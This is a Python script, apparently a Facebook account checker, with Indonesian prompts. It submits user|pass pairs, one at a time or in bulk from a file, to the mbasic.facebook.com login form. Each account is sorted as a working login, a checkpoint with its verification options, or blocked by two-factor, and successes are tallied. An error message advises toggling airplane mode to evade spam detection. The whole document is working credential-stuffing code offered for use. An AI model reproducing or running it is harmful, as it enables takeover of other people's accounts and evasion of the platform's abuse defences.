import requests, re, os, sys
from bs4 import BeautifulSoup

def clear():
	if "win" in sys.platform.lower():
		try:os.system("cls")
		except:pass
	else:
		try:os.system("clear")
		except:pass

ok,cp,error = 0,0,0

class Main:
	
	def __init__(self, useragent):
		self.ua = useragent
		self.host = "mbasic.facebook.com"

class Login(Main):
	
	def check_options(self, session, response, user, password):
		ref = BeautifulSoup(response.text, "html.parser")
		form = ref.find("form", {"method":"post", "enctype":True})
		data = {x.get("name"):x.get("value") for x in form.findAll("input", {"type":"hidden", "value":True})}
		data.update(
			{
				"submit[Continue]":"Lanjutkan"
			}
		)
		response = BeautifulSoup(session.post("https://mbasic.facebook.com"+str(form.get("action")), data=data).text, "html.parser")
		try:
			options = [x.string for x in response.find("select", {"id":"verification_method", "name":"verification_method"}).findAll("option")]
		except:
			options = []
			status = "a2f on"
		if(len(options)==0 and status!="a2f on"):
			status = "tap yes"
		elif(len(options)!=0):
			status = "checkpoint"
		else:
			status = "a2f on"
		output = {
			"account":f"{user}|{password}",
			"output":{
				"status":status,
				"options":options,
				"jumlah_opsi":len(options)
			}
		}
		return output
    
	def log_mfacebook(self, user, password):
		global ok,cp,error
		with requests.Session() as session:
			session.headers.update(
				{
					"host":self.host,
					"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
					"accept-encoding":"gzip, deflate",
					"accept-language":"en-US,en;q=0.9,id;q=0.8",
					"cache-control":"max-age=0",
					"upgrade-insecure-requests":"1",
					"user-agent":self.ua
				}
			)
			fbml = session.get("https://mbasic.facebook.com/fbml/ajax/dialog/")
			soup = BeautifulSoup(fbml.text, "html.parser")
			next_url = soup.findAll("a", {"class":True, "id":True})[1].get("href")
			session.headers.update(
				{
					"referer":"https://mbasic.facebook.com/fbml/ajax/dialog/",
				}
			)
			ref = BeautifulSoup(session.options(next_url).text, "html.parser")
			form = ref.find("form", {"method":"post", "id":"login_form"})
			data = {x.get("name"):x.get("value") for x in form.findAll("input", {"type":"hidden", "value":True})}
			nextTo = form.get("action")
			data.update(
				{
					"email":user,
					"pass":password,
					"login":"Masuk"
				}
			)
			response = session.post("https://mbasic.facebook.com"+str(nextTo), data=data, headers = {
				"content-length":"164",
				"content-type":"application/x-www-form-urlencoded",
				"origin":"https://mbasic.facebook.com",
				"referer":"https://mbasic.facebook.com"+str(nextTo)
			})
			try:
				if "checkpoint" in response.cookies:
					cp += 1
					output = self.check_options(session, response, user, password)
				elif "m_page_voice" in response.cookies:
					ok += 1
					output = {
						"account":f"{user}|{password}",
						"output":{
							"status":"OK",
							"options":None,
							"jumlah_opsi":None
						}
					}
				else:
					error += 1
					soup = BeautifulSoup(response.text, "html.parser")
					try:status = soup.find("div", {"id":"login_error"}).string
					except:status = "aktivitas berlebihan terdeteksi [spam]. segera on off mode pesawat!"
					output = {
						"account":f"{user}|{password}",
						"output":{
							"status":status,
							"options":False,
							"jumlah_opsi":False
						}
					}
			except Exception as e:print(response.text)
			return output

if __name__=="__main__":
    clear()
    #results, result = {}, []
    try:
    	ua = open("data/useragent.txt", "r").read()
    except:
    	try:os.mkdir("data")
    	except:pass
    	print(" {} tidak terdapat useragent!\n () Kunjungi: https://latip176.github.io/getMyUserAgent/ dan copy value dari Your UserAgent\n")
    	open("data/useragent.txt", "a").write(input(" > Paste disini: ")+" [FB_IAB/FB4A;FBAV/35.0.0.48.273;]")
    	exit(" Jalankan Ulang Script Ini!")
    if(ua==""):
    	os.remove("data/useragent.txt")
    	exit(" ! UserAgent Tidak Ada !\n Jalankan Ulang.")
    LOg = Login(ua)
    print("""
    Welcome Sir! Gunakan dengan bijak.
    
    	[1]> Cek Account 1 per 1
    	[2]> Cek Account per File [format: user|pass]
    
    Pilih Menu ^^
    """)
    select = input(" > Chosee: ")
    if(select=="1"):
    	data = input(" >= user|pass: ")
    	print()
    	user,pw = data.split("|")
    	print(LOg.log_mfacebook(user,pw))
    elif(select=="2"):
    	data = input(" >= name file: ")
    	print()
    	try:
    		for x in open(data,"r").readlines():
    			x = x.replace("\n","")
    			user,pw = x.split("|")
    			print(LOg.log_mfacebook(user,pw))
    	except FileNotFoundError:
    		exit(" File Tidak Ditemukan")
    else:print(" !! Luh Buta Kah? !!")
    	
"""
    results.update(
    	{
    		"results":{
    			"data":result
   	 	},
    		"jumlah_akun_cp":cp,
    		"jumlah_akun_ok":ok,
    		"jumlah_akun_error":error
    	}
    )
"""